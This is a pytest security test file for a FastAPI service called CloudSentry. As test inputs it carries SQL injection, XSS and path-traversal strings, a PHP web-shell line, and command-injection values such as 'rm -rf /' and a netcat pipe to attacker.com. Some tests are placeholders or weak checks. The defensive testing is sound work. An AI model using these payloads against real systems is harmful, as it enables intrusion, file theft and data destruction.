import pytest
import json
from fastapi.testclient import TestClient
from unittest.mock import patch, MagicMock
from app.main import app
from app.security.middleware import RateLimitMiddleware, SecurityHeadersMiddleware


class TestSecurity:
    """Security tests for CloudSentry"""
    
    def test_security_headers(self):
        """Test security headers are present"""
        client = TestClient(app)
        response = client.get("/")
        
        # Check security headers
        assert "X-Content-Type-Options" in response.headers
        assert response.headers["X-Content-Type-Options"] == "nosniff"
        
        assert "X-Frame-Options" in response.headers
        assert response.headers["X-Frame-Options"] == "DENY"
        
        assert "X-XSS-Protection" in response.headers
        assert "1; mode=block" in response.headers["X-XSS-Protection"]
    
    def test_cors_headers(self):
        """Test CORS headers"""
        client = TestClient(app)
        response = client.options("/", headers={
            "Origin": "http://localhost:3000",
            "Access-Control-Request-Method": "GET"
        })
        
        assert "access-control-allow-origin" in response.headers.lower()
    
    def test_api_authentication(self):
        """Test API endpoints require authentication (if enabled)"""
        client = TestClient(app)
        
        # Test that public endpoints are accessible
        response = client.get("/health")
        assert response.status_code == 200
        
        # Test that finding endpoints are accessible (auth not enforced in test)
        response = client.get("/api/v1/findings")
        assert response.status_code in [200, 401]  # Either 200 or 401 if auth required
    
    def test_input_validation(self):
        """Test input validation on API endpoints"""
        client = TestClient(app)
        
        # Test invalid severity filter
        response = client.get("/api/v1/findings?severity=INVALID")
        assert response.status_code == 422  # Validation error
        
        # Test invalid date format
        response = client.get("/api/v1/findings?start_date=invalid-date")
        assert response.status_code == 422

    def test_sql_injection_prevention(self):
        """Test SQL injection prevention"""
        client = TestClient(app)
        
        # Try SQL injection in search parameter
        injection_attempts = [
            "test'; DROP TABLE findings; --",
            "' OR '1'='1",
            "'; SELECT * FROM users; --"
        ]
        
        for attempt in injection_attempts:
            response = client.get(f"/api/v1/findings?search={attempt}")
            # Should either reject or sanitize, not crash
            assert response.status_code != 500

    def test_json_injection_prevention(self):
        """Test JSON injection prevention"""
        client = TestClient(app)
        
        # Try to inject malicious JSON
        malicious_json = '{"malicious": "data"}\nDELETE * FROM findings'
        
        response = client.post(
            "/api/v1/findings/test-id",
            json={"status": malicious_json}
        )
        
        # Should not crash
        assert response.status_code != 500

    def test_xss_prevention(self):
        """Test XSS prevention in API responses"""
        client = TestClient(app)
        
        # Try to inject XSS in finding data
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//"
        ]
        
        for payload in xss_payloads:
            # Test in finding creation
            finding_data = {
                "rule_id": "TEST-001",
                "resource_id": payload,
                "resource_type": "test",
                "severity": "HIGH",
                "account_id": "123456789012",
                "region": "us-east-1"
            }
            
            response = client.post("/api/v1/findings", json=finding_data)
            
            # Should either reject or sanitize
            if response.status_code == 200:
                # Check if payload is properly escaped in response
                response_text = response.text
                assert "<script>" not in response_text.lower()
                assert "javascript:" not in response_text.lower()

    def test_rate_limiting(self):
        """Test rate limiting functionality"""
        # Mock rate limiting middleware
        with patch('app.security.middleware.RateLimitMiddleware') as mock_middleware:
            mock_middleware_instance = MagicMock()
            mock_middleware.return_value = mock_middleware_instance
            
            # Simulate rate limiting behavior
            request_count = 0
            def mock_dispatch(request, call_next):
                nonlocal request_count
                request_count += 1
                if request_count > 10:  # Limit to 10 requests
                    from fastapi import HTTPException
                    raise HTTPException(status_code=429, detail="Rate limit exceeded")
                response = MagicMock()
                response.headers = {}
                return response
            
            mock_middleware_instance.dispatch = mock_dispatch
            
            client = TestClient(app)
            
            # Make requests up to limit
            for i in range(10):
                response = client.get("/")
                assert response.status_code != 429
            
            # Next request should be rate limited (if middleware is properly integrated)
            # Note: This test depends on middleware integration

    def test_path_traversal_prevention(self):
        """Test path traversal prevention"""
        client = TestClient(app)
        
        # Try path traversal attacks
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for attempt in path_traversal_attempts:
            # Try in file upload or path parameters
            response = client.get(f"/api/v1/files?path={attempt}")
            # Should not crash or expose sensitive files
            assert response.status_code != 500
            if response.status_code == 200:
                assert "root:" not in response.text  # Unix passwd file content
                assert "[fonts]" not in response.text  # Windows config content

    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        client = TestClient(app)
        
        # Try command injection in parameters
        command_injection_attempts = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 4444",
            "test`whoami`",
            "test$(id)"
        ]
        
        for attempt in command_injection_attempts:
            # Test in various endpoints that might process commands
            response = client.post("/api/v1/audits/trigger", json={
                "audit_type": "security",
                "command": attempt
            })
            
            # Should not crash or execute commands
            assert response.status_code != 500

    def test_file_upload_security(self):
        """Test file upload security"""
        client = TestClient(app)
        
        # Test malicious file uploads
        malicious_files = [
            ("malicious.php", "<?php system($_GET['cmd']); ?>"),
            ("script.js", "<script>alert('xss')</script>"),
            ("executable.exe", b"MZ\x90\x00"),  # PE header
            ("large_file.txt", "A" * (10 * 1024 * 1024))  # 10MB file
        ]
        
        for filename, content in malicious_files:
            files = {"file": (filename, content)}
            response = client.post("/api/v1/upload", files=files)
            
            # Should reject malicious files or sanitize them
            if response.status_code == 200:
                # Check if file was properly handled
                assert response.status_code != 500

    def test_sensitive_data_exposure(self):
        """Test sensitive data exposure prevention"""
        client = TestClient(app)
        
        # Test endpoints that might expose sensitive data
        sensitive_endpoints = [
            "/api/v1/config",
            "/api/v1/secrets",
            "/api/v1/keys",
            "/api/v1/database-info"
        ]
        
        for endpoint in sensitive_endpoints:
            response = client.get(endpoint)
            
            # Should not expose sensitive information
            if response.status_code == 200:
                response_text = response.text.lower()
                sensitive_patterns = [
                    "password", "secret", "key", "token",
                    "database_url", "api_key", "private_key"
                ]
                
                for pattern in sensitive_patterns:
                    # Check if sensitive data is exposed
                    if pattern in response_text:
                        # Ensure it's properly masked or not exposed
                        assert "***" in response_text or "****" in response_text

    def test_authentication_bypass_prevention(self):
        """Test authentication bypass prevention"""
        client = TestClient(app)
        
        # Try various authentication bypass techniques
        bypass_attempts = [
            {"Authorization": "Bearer invalid-token"},
            {"Authorization": "Basic invalid-credentials"},
            {"X-API-Key": "fake-api-key"},
            {"X-Auth-Token": "bypass-token"},
            {}  # No authentication
        ]
        
        for headers in bypass_attempts:
            response = client.get("/api/v1/findings", headers=headers)
            
            # Should either require authentication or be properly secured
            # In test environment, might return 200, but in production should be 401
            assert response.status_code in [200, 401, 403]

    def test_session_security(self):
        """Test session security"""
        client = TestClient(app)
        
        # Test session management
        response = client.get("/health")
        
        # Check for secure session headers
        if "Set-Cookie" in response.headers:
            cookie_header = response.headers["Set-Cookie"]
            
            # Should have secure flags
            assert "Secure" in cookie_header or "HttpOnly" in cookie_header
            assert "SameSite" in cookie_header

    def test_https_enforcement(self):
        """Test HTTPS enforcement"""
        client = TestClient(app)
        
        # Test HSTS header
        response = client.get("/")
        
        if "Strict-Transport-Security" in response.headers:
            hsts_header = response.headers["Strict-Transport-Security"]
            assert "max-age" in hsts_header
            assert "includeSubDomains" in hsts_header

    def test_content_security_policy(self):
        """Test Content Security Policy"""
        client = TestClient(app)
        
        response = client.get("/")
        
        # Check for CSP header
        if "Content-Security-Policy" in response.headers:
            csp = response.headers["Content-Security-Policy"]
            
            # Should have basic CSP directives
            assert "default-src" in csp or "script-src" in csp

    def test_error_message_security(self):
        """Test error message security"""
        client = TestClient(app)
        
        # Test various error conditions
        error_endpoints = [
            "/api/v1/findings/invalid-id",
            "/api/v1/nonexistent-endpoint",
            "/api/v1/findings?invalid-param=value"
        ]
        
        for endpoint in error_endpoints:
            response = client.get(endpoint)
            
            # Error messages should not expose sensitive information
            if response.status_code >= 400:
                response_text = response.text.lower()
                sensitive_info = [
                    "stack trace", "database error", "file path",
                    "internal error", "sql", "query", "exception"
                ]
                
                # Should not expose detailed error information
                for info in sensitive_info:
                    if info in response_text:
                        # Ensure it's properly sanitized
                        assert len(response_text) < 1000  # Not too verbose

    def test_logging_security(self):
        """Test security logging"""
        # This test would verify that security events are properly logged
        # In a real implementation, you would check log files or logging system
        
        # Mock logging system
        with patch('app.security.middleware.logging') as mock_logging:
            mock_logger = MagicMock()
            mock_logging.getLogger.return_value = mock_logger
            
            client = TestClient(app)
            
            # Make a request that should be logged
            response = client.get("/api/v1/findings")
            
            # Verify logging was called (if security logging is implemented)
            # This depends on the actual logging implementation
            pass

    def test_dependency_security(self):
        """Test dependency security"""
        # This test would check for known vulnerabilities in dependencies
        # In a real implementation, you would use tools like safety or bandit
        
        # Mock dependency check
        vulnerable_packages = [
            "requests==2.20.0",  # Example vulnerable version
            "urllib3==1.24.1"    # Example vulnerable version
        ]
        
        # In real implementation, this would check actual dependencies
        # For now, just ensure the test structure exists
        assert len(vulnerable_packages) >= 0  # Placeholder check

    def test_environment_variable_security(self):
        """Test environment variable security"""
        # Test that sensitive environment variables are not exposed
        client = TestClient(app)
        
        # Try to access environment information
        response = client.get("/health")
        
        # Should not expose environment variables
        response_text = response.text.lower()
        sensitive_env_vars = [
            "database_url", "secret_key", "password", "api_key",
            "aws_access_key", "jwt_secret", "redis_url"
        ]
        
        for var in sensitive_env_vars:
            assert var not in response_text

    def test_api_rate_limiting_by_ip(self):
        """Test API rate limiting by IP address"""
        # Mock rate limiting by IP
        with patch('app.security.middleware.RateLimitMiddleware') as mock_middleware:
            mock_middleware_instance = MagicMock()
            mock_middleware.return_value = mock_middleware_instance
            
            # Track IP-based requests
            ip_requests = {}
            
            def mock_dispatch_by_ip(request, call_next):
                client_ip = getattr(request.client, 'host', 'unknown')
                ip_requests[client_ip] = ip_requests.get(client_ip, 0) + 1
                
                if ip_requests[client_ip] > 5:  # Limit per IP
                    from fastapi import HTTPException
                    raise HTTPException(status_code=429, detail="Rate limit exceeded")
                
                response = MagicMock()
                response.headers = {}
                response.status_code = 200
                return response
            
            mock_middleware_instance.dispatch = mock_dispatch_by_ip
            
            client = TestClient(app)
            
            # Make requests from same IP (simulated)
            for i in range(6):
                response = client.get("/")
                if i < 5:
                    assert response.status_code == 200
                else:
                    # Should be rate limited
                    assert response.status_code == 429

    def test_security_headers_middleware_integration(self):
        """Test security headers middleware integration"""
        from fastapi import Request
        from starlette.responses import Response
        
        # Create mock request and response
        mock_request = MagicMock(spec=Request)
        mock_request.client.host = "192.168.1.100"
        mock_request.method = "GET"
        mock_request.url.path = "/test"
        
        mock_response = MagicMock(spec=Response)
        mock_response.headers = {}
        
        # Test middleware
        middleware = SecurityHeadersMiddleware(app=None)
        
        async def mock_call_next(request):
            return mock_response
        
        import asyncio
        response = asyncio.run(middleware.dispatch(mock_request, mock_call_next))
        
        # Verify security headers are added
        assert response.headers["X-Content-Type-Options"] == "nosniff"
        assert response.headers["X-Frame-Options"] == "DENY"
        assert "X-XSS-Protection" in response.headers

    def test_cross_site_scripting_prevention(self):
        """Test comprehensive XSS prevention"""
        client = TestClient(app)
        
        # Test various XSS payloads
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "';alert('xss');//",
            "<iframe src=javascript:alert('xss')>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>",
            "<keygen onfocus=alert('xss') autofocus>",
            "<video><source onerror=alert('xss')>",
            "<audio src=x onerror=alert('xss')>",
        ]
        
        for payload in xss_payloads:
            # Test in different contexts
            test_data = {
                "rule_id": "TEST-001",
                "resource_id": payload,
                "resource_type": "test",
                "severity": "HIGH",
                "account_id": "123456789012",
                "region": "us-east-1",
                "description": payload
            }
            
            response = client.post("/api/v1/findings", json=test_data)
            
            # Should either reject or sanitize
            if response.status_code == 200:
                response_text = response.text.lower()
                # Check that script tags are escaped or removed
                assert "<script>" not in response_text
                assert "javascript:" not in response_text
                assert "onerror=" not in response_text
                assert "onload=" not in response_text
